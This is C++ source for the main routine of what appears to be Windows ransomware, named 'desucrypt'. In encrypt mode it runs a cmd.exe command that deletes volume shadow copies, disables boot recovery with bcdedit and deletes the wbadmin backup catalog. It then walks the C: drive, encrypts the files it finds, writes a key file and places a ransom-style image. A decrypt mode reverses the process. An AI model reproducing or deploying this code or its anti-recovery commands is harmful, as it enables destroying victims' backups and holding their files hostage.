
#include "stdafx.h"

int main(int argc, char **argv)
{
	std::string prgName(argv[0]);
	prgName = prgName.substr(prgName.find_last_of("\\") + 1);
	if (argc < 2) {
		std::cout << "insufficient amount of arguments" << std::endl;
		std::cout << "Usage: " << prgName << " encrypt/decrypt" << std::endl;
		return -1;
	}
	else {
		std::string decision(argv[1]);
		std::cout << argv[1] << std::endl;
		if (decision == "encrypt") {
			action = TRUE;
		}
		else if (decision == "decrypt") {
			action = FALSE;
		}
		else {
			std::cout << "Usage: " << prgName << " encrypt/decrypt" << std::endl;
			//system("pause");
			return -1;
		}
	}
	if (action == TRUE) {
		//BOOL callResult;
		//statFileHandle = CreateFile(L"C:\\stat.info", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		ShellExecute(
			NULL,
			L"helper.exe",
			L"cmd.exe / c vssadmin delete shadows / all / quiet & wmic shadowcopy delete & bcdedit / set{ default } bootstatuspolicy ignoreallfailures & bcdedit / set{ default } recoveryenabled no & wbadmin delete catalog - quiet",
			NULL, NULL, 0);
		initializeCrypt();
		
		
		
		//SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "", SPIF_UPDATEINIFILE);
		rWalking(L"C:\\", true);
		putImage();
		std::cout << "files were collected" << std::endl << "Encrypting..." << std::endl;
		
		iterateFilesDB(action);
		writeKeyToFile();
		//startProcedureOnFile(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm");
		
		
	}
	if (action == FALSE) {
		BOOL callResult;
		callResult = importKeyFromFile();
		
		if (callResult == FALSE) {
			std::cout << "failed" << std::endl;
			return -1;
		}
		searchForEncryptedFiles(L"C:\\", true);
		std::cout << "files were collected" << std::endl << "Decrypting..." << std::endl;
		iterateFilesDB(action);
		//decryptProcedure(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm.desucrpt");
		DeleteFile(L"C:\\desucryptKeyContainer.info");
		DeleteFile(L"C:\\DESUCRYPTinfo.jpg");
	}
	destroyKeys();
	
	
	//startProcedureOnFile(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm");
	//system("pause");
	//decryptProcedure(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm.desucrpt");
	
	//system("pause");
    return 0;
}

